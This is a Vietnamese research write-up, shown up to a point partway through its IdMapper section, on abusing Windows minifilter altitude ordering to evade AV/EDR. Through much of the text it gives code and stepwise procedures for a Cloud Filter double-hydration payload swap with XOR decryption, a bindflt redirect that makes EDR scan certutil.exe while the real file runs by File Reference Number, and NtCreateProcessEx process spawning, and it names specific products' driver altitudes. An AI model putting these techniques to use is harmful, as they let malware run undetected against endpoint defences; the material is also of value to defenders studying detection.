*Research Documentation*

# Lạm Dụng Kiến Trúc Windows Minifilter Để Vượt Qua AV/EDR

 Phân tích kỹ thuật chuyên sâu về 3 phương pháp: SyncProvider (CldFlt), BindLinks (bindflt), và WOFProvider (Wof) — cách chúng khai thác thứ tự altitude của minifilter để drop và thực thi payload mà không bị phát hiện bởi giải pháp bảo mật endpoint.

 - Puzzle by Kudaes
- Cập nhật: 2026-07-02
- Windows 10/11/Server

## Mục lục

1. [Nền tảng: Kiến trúc Windows Minifilter & Filter Manager](#s1)
2. [Altitude — Chìa khóa của mọi kỹ thuật](#s2)
3. [Kỹ thuật 1: SyncProvider — Cloud Filter API (CldFlt)](#s3)
4. [Kỹ thuật 2: BindLinks — Bind Filter (bindflt)](#s4)
5. [IdMapper — Thực thi qua File Reference Number](#s5)
6. [Kỹ thuật 3: WOFProvider — Windows Overlay Filter (Wof)](#s6)
7. [Utils — Công cụ hỗ trợ](#s7)
8. [Chuỗi tấn công kết hợp](#s8)
9. [Phát hiện & Phòng chống](#s9)
10. [Hạn chế & Rủi ro thực tế](#s10)

## Nền Tảng: Kiến Trúc Windows Minifilter & Filter Manager

### Filter Manager là gì?

**Filter Manager** (`FltMgr.sys`) là một thành phần kernel-mode của Windows, hoạt động như một legacy file system filter driver. Nó cung cấp framework để các **minifilter driver** đăng ký và xử lý các I/O request mà không cần tự quản lý toàn bộ I/O stack như legacy filter driver truyền thống.

Khi một ứng dụng user-mode thực hiện thao tác file (đọc, ghi, tạo, xóa...), I/O Manager tạo một **IRP** (I/O Request Packet) và gửi xuống file system stack. Filter Manager đứng giữa I/O Manager và file system, cho phép các minifilter chặn, kiểm tra, sửa đổi hoặc chặn các IRP này.

### Kiến trúc nội bộ của Filter Manager

Filter Manager tổ chức theo cấu trúc phân cấp:

- **Frame** — mỗi frame chứa một tập các minifilter instances. Filter Manager tạo ít nhất 1 frame cho mỗi file system stack. Frame xác định phạm vi altitude mà các minifilter trong nó sử dụng
- **Volume** — đại diện cho một volume đã mount (ví dụ: `C:`, `D:`). Mỗi volume có danh sách các minifilter instances đã attach
- **Instance** — khi một minifilter attach vào một volume, Filter Manager tạo một instance. Mỗi minifilter có thể có nhiều instances (trên nhiều volume khác nhau)
- **Context** — dữ liệu mà minifilter gắn vào volume, instance, file, stream, hoặc stream handle. Context cho phép minifilter lưu trạng thái riêng

### IRP vs Fast I/O

Windows có 2 đường dẫn I/O mà minifilter phải xử lý:

| Đặc điểm | IRP-based I/O | Fast I/O |
| --- | --- | --- |
| Cơ chế | I/O Request Packet — cấu trúc dữ liệu kernel mô tả đầy đủ I/O operation | Callback trực tiếp đến file system, bypass IRP overhead |
| Khi nào dùng | Mọi I/O operation: create, read, write, close, cleanup, set info... | Cached read/write khi data đã nằm trong cache manager — nhanh hơn IRP |
| Minifilter callback | Pre/Post-operation callbacks cho mỗi IRP major function | Pre/Post callbacks — minifilter có thể cho phép, chặn, hoặc convert sang IRP |
| Tần suất | Mọi lúc | Chỉ khi dữ liệu cached và điều kiện thỏa mãn |
| Liên quan đến evasion | AV scan thường hook IRP_MJ_CREATE và IRP_MJ_WRITE | Fast I/O có thể bị bỏ qua bởi một số AV implementation |

### Minifilter Driver hoạt động thế nào?

Một minifilter đăng ký với Filter Manager thông qua `FltRegisterFilter()` trong `DriverEntry()`. Nó khai báo các **callback** cho từng loại I/O operation mà nó quan tâm:

- **Pre-operation callback** — được gọi TRƯỚC khi I/O request đến file system. Minifilter có thể:
  - `FLT_PREOP_SUCCESS_WITH_CALLBACK` — cho phép I/O đi tiếp, muốn nhận post-callback
  - `FLT_PREOP_SUCCESS_NO_CALLBACK` — cho phép I/O đi tiếp, không cần post-callback
  - `FLT_PREOP_COMPLETE` — hoàn thành I/O ngay (chặn hoặc tự xử lý)
  - `FLT_PREOP_PENDING` — giữ IRP chờ xử lý async
- **Post-operation callback** — được gọi SAU khi file system xử lý xong. Minifilter có thể kiểm tra kết quả, sửa đổi dữ liệu trả về, hoặc thay đổi status code

### Các IRP major function quan trọng cho AV/EDR

| IRP | Mô tả | AV dùng để |
| --- | --- | --- |
| `IRP_MJ_CREATE` | Mở hoặc tạo file/directory | On-access scanning — mở file để scan nội dung trước khi user truy cập. Nhận file path, access rights, open disposition |
| `IRP_MJ_WRITE` | Ghi dữ liệu vào file | On-write scanning — scan nội dung mới được ghi. Nhận buffer, offset, length |
| `IRP_MJ_READ` | Đọc dữ liệu từ file | Content inspection — có thể scan data trước khi trả về cho ứng dụng |
| `IRP_MJ_CLEANUP` | Handle cuối cùng đến file đang được đóng | Deferred scanning — scan file sau khi tất cả write đã hoàn thành (hiệu quả hơn scan từng write) |
| `IRP_MJ_CLOSE` | File object đang bị hủy | Cleanup context, cache invalidation |
| `IRP_MJ_SET_INFORMATION` | Thay đổi file attributes (rename, delete, size...) | Detect rename/delete operations — ví dụ: ransomware rename + encrypt pattern |
| `IRP_MJ_ACQUIRE_FOR_SECTION_SYNC` | Section object đang được tạo từ file | Detect image mapping — biết khi nào một PE file đang được load để thực thi |

### Communication Port — Kênh user-kernel

Minifilter giao tiếp với ứng dụng user-mode thông qua **communication port**, tạo bằng `FltCreateCommunicationPort()`. Ứng dụng user-mode kết nối qua `FilterConnectCommunicationPort()`. Đây là cơ chế mà `bindfltapi.dll` sử dụng để giao tiếp với `bindflt.sys`.

Security descriptor trên port quyết định ai được phép kết nối. `FltBuildDefaultSecurityDescriptor()` tạo SD chỉ cho phép **SYSTEM** và **Administrators**. Đây là lý do bindflt yêu cầu admin.

> **Điểm mấu chốt**
>
>  AV/EDR minifilter hoạt động bằng cách **đăng ký callback cho các I/O operation**. Nếu một write operation không bao giờ đi qua callback của AV/EDR, thì nội dung ghi xuống disk sẽ **không bao giờ được scan**. Toàn bộ tài liệu này xoay quanh việc khai thác đặc điểm này.

## Altitude — Chìa Khóa Của Mọi Kỹ Thuật

### Altitude là gì?

Mỗi minifilter khi đăng ký với Filter Manager được gán một giá trị **altitude** — một chuỗi số duy nhất xác định vị trí của nó trong I/O filter stack. Altitude quyết định **thứ tự mà các minifilter nhận và xử lý I/O request**. Microsoft quản lý việc cấp altitude thông qua email request (`fsfcomm@microsoft.com`) — mỗi minifilter nhận một altitude cố định không bao giờ thay đổi.

### Dải Altitude chi tiết

Microsoft phân chia altitude thành các dải (load order group) theo chức năng:

| Dải Altitude | Phạm vi | Chức năng | Ví dụ |
| --- | --- | --- | --- |
| Filter | 400000–409999 | Bộ lọc truy cập, cách ly, bind filter | **bindflt (409800)**, wcifs (407000) |
| Quota Management | 380000–389999 | Quản lý quota disk | — |
| System Recovery | 360000–369999 | Khôi phục hệ thống | — |
| Undelete | 340000–349999 | Recycle bin | — |
| **Anti-Virus** | **320000–329998** | **AV/EDR minifilter** | WdFilter (328010), csagent |
| Replication | 300000–309999 | Nhân bản dữ liệu | dfsr (300000) |
| Continuous Backup | 280000–289999 | Sao lưu liên tục | — |
| Content Screener | 260000–269999 | Kiểm duyệt nội dung | — |
| HSM | 180000–189999 | Hierarchical Storage Management | **CldFlt (180451)** |
| Imaging | 60000–69999 | ZIP-like virtual namespaces | — |
| Compression | 40000–49999 | Nén dữ liệu transparent | **Wof (40700)** |
| Encryption | 140000–149999 | Mã hóa file-level | EFS, BitLocker |
| Bottom | 20000–29999 | Minifilter gần file system nhất | — |

### Altitude cụ thể của các AV/EDR

Một số AV/EDR minifilter phổ biến và altitude đã đăng ký:

| Sản phẩm | Driver | Altitude |
| --- | --- | --- |
| Microsoft Defender | `WdFilter.sys` | 328010 |
| CrowdStrike Falcon | `csagent.sys` | 328760 |
| SentinelOne | `sentinel*.sys` | 326920–326960 |
| Symantec/Broadcom | `symefasi.sys` | 320000 |
| ESET | `eelam.sys / ekrn.sys` | 320000 |
| Kaspersky | `klif.sys` | 320900 |
| Carbon Black (VMware) | `cbfilter.sys` | 329010 |

Tất cả đều nằm trong dải **320000–329998**, nghĩa là tất cả đều nằm **TRÊN** CldFlt (180451) và Wof (40700), nhưng **DƯỚI** bindflt (409800).

### Hướng đi của I/O request trong filter stack

Khi một I/O request (ví dụ: `IRP_MJ_WRITE`) được tạo từ user-mode:

1. **I/O Manager** tạo IRP và gửi đến Filter Manager
2. **Pre-operation**: Filter Manager gọi pre-callback của minifilter ở altitude **cao nhất** trước, rồi lần lượt đi xuống
3. **File system** (NTFS/ReFS) xử lý request thực sự
4. **Post-operation**: callback đi ngược lên từ altitude **thấp** lên **cao**
5. Kết quả trả về cho user-mode

```text
∞ | I/O Manager | User-mode request
↓ Pre-op: cao → thấp ↓
409800 | bindflt | Filter band
↓
328010 | WdFilter (Defender) | Anti-Virus band
↓
180451 | CldFlt | HSM band
↓
40700 | Wof | Compression band
↓
— | NTFS / ReFS | File System Driver
↑ Post-op: thấp → cao ↑
```

### Liệt kê minifilter đang chạy

```
REM Liệt kê tất cả minifilter đang load
fltmc

REM Liệt kê instances trên từng volume
fltmc instances

REM Output ví dụ:
REM Filter                Num Instances    Altitude    Frame
REM ---------------------  ----------       --------    -----
REM bindflt                1               409800       0
REM WdFilter               5               328010       0
REM storqosflt             0               244000       0
REM CldFlt                 3               180451       0
REM Wof                    3               40700        0
```

### FltWriteFileEx() — Cơ chế blind spot

Tài liệu chính thức của Microsoft về `FltWriteFileEx()` nêu rõ:

```
"A minifilter driver calls FltWriteFileEx to write data to an open file...
The FltWriteFileEx function causes a write request to be sent to the
minifilter driver instances attached BELOW the initiating instance
and to the file system. The specified instance and the instances
attached ABOVE it do not receive the write request."
```

Tương tự, `FltReadFileEx()` chỉ gửi read request đến minifilter instances **bên dưới** minifilter khởi tạo. Đây là thiết kế hợp pháp (tránh vòng lặp vô hạn khi minifilter tự đọc/ghi file) — nhưng nó tạo ra **architectural blind spot** mà cả 3 kỹ thuật khai thác.

> **Nguyên lý cốt lõi**
>
>  **CldFlt (180451)** nằm dưới AV: FltWriteFileEx ghi data xuống NTFS mà AV ở 320000+ không bao giờ thấy write callback.
>
>  **bindflt (409800)** nằm trên AV: redirect path trước khi AV nhận I/O request, nên AV nhìn thấy file backing (sạch) thay vì file thực sự.
>
>  **Wof (40700)** nằm dưới AV: lưu trữ malware trong WIM container mà AV không parse khi ghi.

## Kỹ Thuật 1: SyncProvider — Cloud Filter API (CldFlt)

| Thuộc tính | Giá trị |
| --- | --- |
| Minifilter | `CldFlt.sys` |
| Altitude | 180451 (HSM band) |
| DLL | `CldApi.dll` (Cloud Filter API / Cloud Files API) |
| Yêu cầu Admin | Không |
| Bypass | Static analysis, signature-based AV scanning, on-write scanning |
| Có sẵn từ | Windows 10 1709 (Fall Creators Update) trở lên |
| Binary | `sync_provider.exe` |

### Cloud Filter API là gì?

Cloud Filter API là framework của Windows cho phép ứng dụng tạo **sync engine** — tương tự OneDrive, Dropbox, Google Drive. Nó quản lý đồng bộ file giữa cloud storage và local file system thông qua cơ chế **placeholder**. Khi CldFlt được load trên một volume, nó đăng ký cho `IRP_MJ_CREATE`, `IRP_MJ_READ`, `IRP_MJ_WRITE`, `IRP_MJ_CLEANUP` và nhiều IRP khác để intercept truy cập đến placeholder files.

### Trạng thái của Placeholder

| Trạng thái | File attribute flag | Nội dung trên disk | Mô tả |
| --- | --- | --- | --- |
| **Dehydrated** | `FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS` (0x400000) | Không — chỉ metadata | Nội dung ở remote. Khi truy cập, CldFlt trigger hydration callback |
| **Hydrating** | — | Đang download | Trạng thái tạm thời trong quá trình hydration |
| **Hydrated** | Không có recall flag | Có | Nội dung đã có trên disk. Có thể bị OS tự động dehydrate khi disk đầy |
| **Pinned** | `FILE_ATTRIBUTE_PINNED` (0x80000) | Có — cố định | Nội dung được giữ trên disk vĩnh viễn |

### Mode 1 vs Mode 2

##### Mode 1: Single Hydration

- Chỉ hydrate 1 lần
- Ghi nội dung backing file 1 (benign)
- Dùng để test: đảm bảo sync provider hoạt động
- Không có payload swap
- Không bypass AV (file sạch)

##### Mode 2: Double Hydration

- Hydrate lần 1: file sạch → AV scan pass
- Đợi 10s, toggle index
- Hydrate lần 2: payload thật → ghi đè
- AV không rescan (no USN change)
- **Bypass static AV scan**

### Luồng hoạt động chi tiết — Mode 2 (Double Hydration)

#### Bước 1: Đăng ký Sync Root

`CfRegisterSyncRoot()` đăng ký thư mục làm sync root. Windows ghi thông tin vào Registry tại `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\SyncRootManager`. CldFlt bắt đầu monitor thư mục này.

```
// Cấu trúc CF_SYNC_REGISTRATION — xác định identity của provider
CF_SYNC_REGISTRATION reg = {0};
reg.StructSize       = sizeof(reg);
reg.ProviderName     = L"RandomProviderName";  // Tên hiển thị
reg.ProviderVersion  = L"1.0";
reg.SyncRootIdentity = provider_name;           // Identity bytes
reg.SyncRootIdentityLength = wcslen(provider_name) * 2 + 2;
reg.ProviderId       = {0x12345678, 0x9abc, 0xdef0,...}; // GUID duy nhất

// Cấu trúc CF_SYNC_POLICIES — chính sách hydration
CF_SYNC_POLICIES pol = {0};
pol.StructSize       = sizeof(pol);
pol.Hydration.Primary  = CF_HYDRATION_POLICY_FULL;   // = 2
                     // Hydrate toàn bộ file, không theo chunks
pol.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_STREAMING_ALLOWED; // = 2
pol.Population.Primary = CF_POPULATION_POLICY_PARTIAL; // = 0
                     // Chỉ populate placeholder khi user truy cập thư mục
pol.PlaceholderManagement = 1; // CREATE_UNRESTRICTED — cho phép tạo placeholder tự do

CfRegisterSyncRoot(L"C:\\SyncRoot", ®, &pol, CF_REGISTER_FLAG_NONE);
```

#### Bước 2: Kết nối và đăng ký Callback

`CfConnectSyncRoot()` kết nối provider với CldFlt driver, đăng ký bảng callback. Từ thời điểm này, CldFlt sẽ gọi callback khi có I/O đến placeholder.

```
CF_CALLBACK_REGISTRATION table[3] = {
    { CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS, fetch_placeholders_cb },  // = 3
    { CF_CALLBACK_TYPE_FETCH_DATA,         fetch_data_cb         },  // = 0
    { CF_CALLBACK_TYPE_NONE,               NULL                  }   // = -1 (terminator)
};

LONGLONG connection_key;
CfConnectSyncRoot(
    L"C:\\SyncRoot",
    table,
    NULL,  // callback context
    CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO |    // = 0x2 — nhận PID, image path, cmdline
    CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH,  // = 0x4 — nhận normalized path
    &connection_key  // output: dùng cho mọi operation sau này
);
```

#### Bước 3: Tạo Placeholder

`CfCreatePlaceholders()` tạo file placeholder trên disk. File có đầy đủ metadata (tên, kích thước) nhưng **nội dung rỗng**. Kích thước được set bằng backing file 1 (file sạch).

```
CF_PLACEHOLDER_CREATE_INFO pc = {0};
pc.RelativeFileName = L"payload.exe";
pc.FsMetadata.BasicInfo.FileAttributes = FILE_ATTRIBUTE_ARCHIVE; // = 0x20
pc.FsMetadata.FileSize = sizeof_benign_file;  // Kích thước file sạch!
pc.FileIdentity = name_w;             // Identity bytes cho callback
pc.FileIdentityLength = wcslen(name_w) * 2 + 2;
pc.Flags = CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC; // = 2

ULONG entries;
CfCreatePlaceholders(L"C:\\SyncRoot", &pc, 1, 0, &entries);
```

> **Chi tiết kĩ thuật**
>
>  Placeholder size PHẢI bằng kích thước của backing file 1 (file sạch), **không phải** payload. Vì khi AV truy cập placeholder, CldFlt báo kích thước này cho file system. Nếu kích thước không khớp với dữ liệu được transfer, hydration sẽ fail. Payload (backing file 2) có thể có kích thước khác — CfExecute sẽ ghi đè phần đầu hoặc toàn bộ file tùy theo kích thước.

#### Bước 4: Set Provider Status Idle

`CfUpdateSyncProviderStatus()` báo cho Explorer rằng provider đã sẵn sàng. Explorer hiển thị icon cloud cho placeholder files.

```
CfUpdateSyncProviderStatus(connection_key, CF_PROVIDER_STATUS_IDLE); // = 1
```

#### Bước 5: fetch_data Callback — Hydration lần 1

Khi bất kỳ process nào truy cập placeholder (AV scan, user double-click, Explorer preview...), CldFlt gọi `fetch_data_cb()`. Callback nhận thông tin đầy đủ qua `CF_CALLBACK_INFO`:

```c
struct CF_CALLBACK_INFO {

    +0x00 ULONG    struct_size;

    +0x08 LONGLONG connection_key; // phải match khi gọi CfExecute

    +0x10 PVOID    callback_context;

    +0x18 PWSTR    volume_guid_name; // \\?\Volume{GUID}\

    +0x20 PWSTR    volume_dos_name;  // C:\

    +0x28 ULONG    volume_serial_number;

    +0x30 LONGLONG sync_root_file_id;

    +0x38 PVOID    sync_root_identity;

    +0x40 ULONG    sync_root_identity_length;

    +0x48 LONGLONG file_id; // NTFS File Reference Number

    +0x50 LONGLONG file_size;

    +0x58 PVOID    file_identity;

    +0x60 ULONG    file_identity_length;

    +0x68 PWSTR    normalized_path; // đường dẫn đầy đủ

    +0x70 LONGLONG transfer_key; // BẮT BUỘC cho CfExecute — kernel validate

    +0x78 BYTE     priority_hint;

    +0x80 PVOID    correlation_vector;

    +0x88 PVOID    process_info; // → CF_PROCESS_INFO (PID, image path, cmdline)

    +0x90 LONGLONG request_key;

    }; // sizeof = 0x98 (152 bytes) trên x64
```

`process_info` chứa PID và command line của process đang truy cập placeholder — có thể thấy `MsMpEng.exe` (Defender), `explorer.exe`, hoặc bất kỳ process nào khác.

Callback đọc `RequiredFileOffset` và `RequiredLength` từ callback parameters, rồi truyền nội dung file sạch qua `CfExecute(CF_OPERATION_TYPE_TRANSFER_DATA)`:

```
// Chuẩn bị operation info — connection_key và transfer_key bắt buộc
CF_OPERATION_INFO oi = {0};
oi.StructSize     = sizeof(oi);
oi.Type           = CF_OPERATION_TYPE_TRANSFER_DATA;  // = 0
oi.ConnectionKey  = info->ConnectionKey;  // kernel validate giá trị này
oi.TransferKey    = info->TransferKey;    // kernel validate giá trị này

// Chuẩn bị parameters — buffer chứa nội dung file sạch
CF_OPERATION_PARAMETERS op = {0};
op.ParamSize = sizeof(op);
op.TransferData.Buffer = benign_content + RequiredOffset;
op.TransferData.Offset = RequiredOffset;
op.TransferData.Length = RequiredLength;
op.TransferData.CompletionStatus = STATUS_SUCCESS;  // = 0

CfExecute(&oi, &op);
// → CldFlt gọi FltWriteFileEx() nội bộ
// → Write request chỉ đi XUỐNG dưới altitude 180451
// → AV ở 320000+ KHÔNG nhận write callback
// → NTFS ghi nội dung file sạch xuống disk
```

#### Bước 6: Double Hydration — Ghi đè payload

Ngay trong callback `fetch_data_cb()`, sau khi hydration lần 1 thành công (CfExecute trả về `S_OK`):

1. **** — CfOpenFileWithOplock() Mở oplock trên placeholder. Bắt buộc — không có oplock, CldFlt từ chối proactive hydration. Oplock đảm bảo không có process khác đang write vào file cùng lúc.
 2. **** — Toggle placeholder_index (0 → 1) Dùng InterlockedXor(&g_index, 1) (C) hoặc AtomicUsize::fetch_xor(1) (Rust) để thread-safe toggle. Từ giờ get_backing_content() trả về payload thay vì file sạch. Nếu payload được XOR encrypt, giải mã tại thời điểm này.
 3. **** — Sleep(10000) — Đợi 10 giây CldFlt cần thời gian để hoàn tất internal state transition của hydration lần 1. Nếu gọi CfExecute ngay, trả về E_FAIL hoặc HRESULT 0x80070057. 10 giây là giá trị thực nghiệm đủ an toàn.
 4. **** — CfExecute lần 2 — Ghi payload thật Gọi lại CfExecute(CF_OPERATION_TYPE_TRANSFER_DATA) với nội dung payload. CldFlt gọi FltWriteFileEx() lần nữa, ghi đè nội dung trên disk.
 5. **** — CfCloseHandle() — Giải phóng oplock Đóng protected handle, giải phóng oplock.

> **Tại sao AV không thấy write lần 2 — Phân tích chi tiết**
>
>  **Lý do 1 — Altitude barrier:** CldFlt ở altitude 180451 dùng `FltWriteFileEx()`. Theo thiết kế của Filter Manager, write request chỉ đi xuống đến NTFS, không bao giờ đi lên đến WdFilter (328010) hay bất kỳ AV minifilter nào ở trên.
>
>  **Lý do 2 — Paging I/O flag:** CldFlt đánh dấu write với `FLTFL_IO_OPERATION_PAGING`. Đây là loại I/O đặc biệt:
>
> - Không tạo USN Journal entry — ứng dụng monitoring USN changes không biết file đã thay đổi
> - Không cập nhật `$STANDARD_INFORMATION.LastWriteTime` trong MFT
> - Không invalidate cached scan result — AV vẫn coi file là "đã scan, sạch" từ lần hydration đầu tiên
> - Đây là behavior hợp pháp: paging I/O dùng cho cache manager writeback, memory-mapped file write. CldFlt tận dụng cơ chế này
>
>
>  **Lý do 3 — Không trigger IRP_MJ_CREATE mới:** File đã mở (hydrated) — không có open/create event mới để trigger on-access scan.

### XOR Encryption/Decryption

Payload (backing file 2) có thể được XOR encrypt trước khi sử dụng. Khi `placeholder_index == 1` và key không rỗng, `get_backing_content()` giải mã on-the-fly:

```
// XOR decryption — key repeating (key[i % key_len])
void xor_crypt(BYTE *data, size_t data_len, const BYTE *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++)
        data[i] ^= key[i % key_len];
}

// Giải mã tạo bản copy mới, không modify backing file gốc
BYTE *copy = malloc(backing_size);
memcpy(copy, backing[1], backing_size);
xor_crypt(copy, backing_size, key, key_len);
```

XOR encrypt giúp payload trên disk (file gốc) không bị AV scan static. Chỉ khi hydration lần 2, nội dung mới được decrypt và ghi vào placeholder.

### Dehydrate — Reset lại placeholder

Sau khi thực thi payload xong, attacker có thể **dehydrate** placeholder để xóa nội dung payload khỏi disk và chuẩn bị cho lần tiếp theo:

```
// Mở file với oplock
CfOpenFileWithOplock(path, 0, &protected_handle);

// Lấy Win32 handle từ protected handle
HANDLE file_handle = CfGetWin32HandleFromProtectedHandle(protected_handle);

// Dehydrate — xóa nội dung, giữ metadata
CfDehydratePlaceholder(
    file_handle,
    0,     // StartingOffset — từ đầu
    -1,    // Length — đến cuối file (EOF)
    0,     // CF_DEHYDRATE_FLAG_NONE
    NULL   // Không async
);

// Dọn dẹp handle
CfReleaseProtectedHandle(file_handle);
CfCloseHandle(protected_handle);

// Toggle index về 0 → lần hydration tiếp sẽ bắt đầu từ file sạch
InterlockedXor(&g_index, 1);
```

> **Ưu điểm chính**
>
>  **Không cần quyền Administrator.** Cloud Filter API được thiết kế cho ứng dụng user-mode bình thường (OneDrive chạy dưới quyền user). Đây là kỹ thuật duy nhất trong 3 kỹ thuật có thể hoạt động với quyền user thông thường — giá trị cao cho initial access.

## Kỹ Thuật 2: BindLinks — Bind Filter (bindflt)

| Thuộc tính | Giá trị |
| --- | --- |
| Minifilter | `bindflt.sys` |
| Altitude | 409800 (Filter band — **TRÊN** AV) |
| DLL | `bindfltapi.dll` |
| Yêu cầu Admin | Có |
| Bypass | Runtime path-based file content inspection |
| Mục đích gốc | Windows Containers, WSL filesystem virtualization |
| Binary | `bindlinks.exe` |

### Bindlink hoạt động ở kernel level thế nào?

Khi `bindflt.sys` load trong `DriverEntry()`:

1. Đăng ký minifilter với Filter Manager tại altitude 409800
2. Tạo communication port bằng `FltCreateCommunicationPort()` trên port name `"\\BindFltPort"`
3. Set security descriptor bằng `FltBuildDefaultSecurityDescriptor()` — chỉ SYSTEM và Administrators
4. Đăng ký **pre-operation callback** cho `IRP_MJ_CREATE`

Khi nhận `IRP_MJ_CREATE`, bindflt kiểm tra file path có match với bất kỳ virtual path nào đã đăng ký không. Nếu match, nó **rewrite target path** trong IRP sang backing path trước khi IRP đi xuống các minifilter bên dưới (bao gồm AV).

#### API: BfSetupFilter

```
HRESULT BfSetupFilter(
    HANDLE    JobHandle,    // NULL = global, non-NULL = scoped to job object
    ULONG     Flags,        // BINDFLT_FLAG_* (0 = none)
    LPCWSTR   VirtualPath,  // Đường dẫn ảo (sẽ bị redirect)
    LPCWSTR   BackingPath,  // Đường dẫn thật (AV sẽ thấy file này)
    ULONG     MergeFlagCount,
    LPCWSTR  *MergeFlags    // NULL khi không merge directories
);

// Ví dụ: mọi access đến payload.exe → trả về certutil.exe
BfSetupFilter(
    NULL,   // Global — không scoped to job
    0,      // Không flags đặc biệt
    L"C:\\SyncRoot\\payload.exe",           // Virtual path
    L"C:\\Windows\\System32\\certutil.exe", // Backing path (file sạch)
    0, NULL
);
```

#### Tại sao bindflt cần admin?

`FltBuildDefaultSecurityDescriptor()` tạo security descriptor với DACL:

- `SYSTEM` — Full Access
- `BUILTIN\Administrators` — Full Access
- Tất cả SID khác — **Access Denied**

Khi user thường gọi `BfSetupFilter()`, hàm này nội bộ gọi `FilterConnectCommunicationPort("\\BindFltPort")`. Filter Manager kiểm tra token của calling process với DACL trên port → từ chối với `STATUS_ACCESS_DENIED` (0xC0000022).

### Vấn đề: Redirect là hai chiều

Khi bindlink active, **MỌI** truy cập theo path đến `payload.exe` đều bị redirect sang `certutil.exe` — kể cả khi attacker muốn thực thi payload. Cần một cách mở file mà bypass bindlink → đó là **File Reference Number**.

### File Reference Number (FRN) — Bypass bindlink

Mỗi file trên NTFS volume được định danh bằng **File Reference Number (FRN)** — một giá trị 64-bit duy nhất được lưu trong MFT (Master File Table). FRN gồm 2 phần:

| Bits | Tên | Mô tả |
| --- | --- | --- |
| 0–47 (48 bits) | MFT Record Number | Index trong MFT, duy nhất tại thời điểm hiện tại |
| 48–63 (16 bits) | Sequence Number | Tăng mỗi lần MFT record bị reuse (detect stale references) |

Khi mở file bằng FRN qua `OpenFileById()`, I/O request đi thẳng đến NTFS driver thông qua `FILE_OPEN_BY_FILE_ID` flag. NTFS resolve FRN trực tiếp trong MFT, **không qua path resolution** → bindflt không có path để redirect.

```
// Lấy FRN trước khi tạo bindlink (quan trọng!)
// Dùng GetFileInformationByHandle
BY_HANDLE_FILE_INFORMATION info;
HANDLE hFile = CreateFileW(L"C:\\SyncRoot\\payload.exe",...);
GetFileInformationByHandle(hFile, &info);
ULONGLONG frn = ((ULONGLONG)info.nFileIndexHigh << 32) | info.nFileIndexLow;
CloseHandle(hFile);
// Ví dụ: frn = 0x000600000000A1B2

// Mở file bằng FRN — bypass mọi bindlink
HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
    FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

FILE_ID_DESCRIPTOR desc;
desc.dwSize = sizeof(desc);
desc.Type   = FileIdType;                   // = 0
desc.FileId.QuadPart = (LONGLONG)frn;

HANDLE hFile = OpenFileById(hVol, &desc,
    GENERIC_READ | GENERIC_EXECUTE,
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    NULL, 0);
// → hFile trỏ đến payload.exe thật, KHÔNG bị redirect sang certutil.exe
```

### Kết quả: EDR bị lừa

1. **** — Attacker mở file bằng FRN Bypass bindlink hoàn toàn. Truy cập trực tiếp malware trên disk qua MFT lookup.
 2. **** — Tạo process (NtCreateProcessEx hoặc manual map) File handle → image section → process. Kernel map binary code vào memory từ file handle gốc.
 3. **** — EDR nhận PsSetCreateProcessNotifyRoutineEx callback EDR biết process mới được tạo. Muốn kiểm tra binary → mở file bằng path.
 4. **** — bindflt redirect EDR's file open bindflt ở altitude 409800 (TRÊN EDR ở ~328000) → pre-op callback rewrite path → EDR nhận handle đến certutil.exe.
 5. **** — EDR scan certutil.exe → clean File hợp pháp, Microsoft-signed, Authenticode valid. Scan pass. EDR cho phép process chạy.
 6. **** — Malware chạy thành công Kernel đã map image từ file handle gốc (FRN-based, bypass bindlink). Code thực thi là malware.

> **Tại sao BindLinks bypass được — tóm tắt**
>
>  bindflt ở altitude **409800** (trên AV ở ~320000–329000). Nó redirect **trước** khi AV nhận I/O request. EDR mở file bằng path → thấy file sạch. Attacker mở file bằng FRN → thấy malware. **Cùng một file path, hai nội dung khác nhau** tùy thuộc vào cách mở.

## IdMapper — Thực Thi Qua File Reference Number

| Thuộc tính | Giá trị |
| --- | --- |
| Yêu cầu Admin | Có (mở volume handle cần GENERIC_READ) |
| Mode | "spawn" (process mới) hoặc "load" (manual PE mapping) |
| Binary | `id_mapper.exe` |

### Mode "spawn" — NtCreateProcessEx từ Image Section

Tạo process mới hoàn toàn mới từ image section, không qua `CreateProcess()`. Tránh nhiều EDR hook trên `kernel32!CreateProcessW`.

1. **** — OpenFileById() → File handle Mở file bằng FRN, bypass bindlink.
 2. **** — NtCreateSection(SEC_IMAGE) → Section handle Tạo image section từ file. Kernel validate PE headers, tạo section object. SEC_IMAGE = 0x01000000 → kernel parse PE format, setup relocation info. NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE_READ, SEC_IMAGE, hFile);
 3. **** — NtMapViewOfSection() → Đọc Entry Point RVA Map section vào process hiện tại (read-only) để parse PE header và lấy AddressOfEntryPoint RVA. PVOID view = NULL; SIZE_T view_size = 0; NtMapViewOfSection(hSection, GetCurrentProcess(), &view, 0, 0, NULL, &view_size, ViewUnmap, 0, PAGE_EXECUTE_READ); // Parse: dos->e_lfanew → nt_headers → OptionalHeader.AddressOfEntryPoint
 4. **** — NtCreateProcessEx() → Process mới Tạo process từ section handle. Process được tạo trong suspended state, chưa có thread. NtCreateProcessEx(&hProc, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), 0, hSection, NULL, NULL, 0);
 5. **** — Lấy PEB address + ImageBaseAddress Dùng NtQueryInformationProcess(ProcessBasicInformation) để lấy PebBaseAddress. Sau đó đọc PEB+0x10 (ImageBaseAddress trên x64) bằng NtReadVirtualMemory().
 6. **** — Tạo Environment Block + Process Parameters CreateEnvironmentBlock() (userenv.dll) tạo env block mới. RtlCreateProcessParametersEx() tạo RTL_USER_PROCESS_PARAMETERS với image path, command line, current directory.
 7. **** — Ghi env block + parameters vào remote process NtAllocateVirtualMemory() + NtWriteVirtualMemory() hai lần: một cho env block, một cho parameters struct.
 8. **** — Fix embedded pointers (Delta Relocation) Đây là bước phức tạp nhất. Xem chi tiết bên dưới.
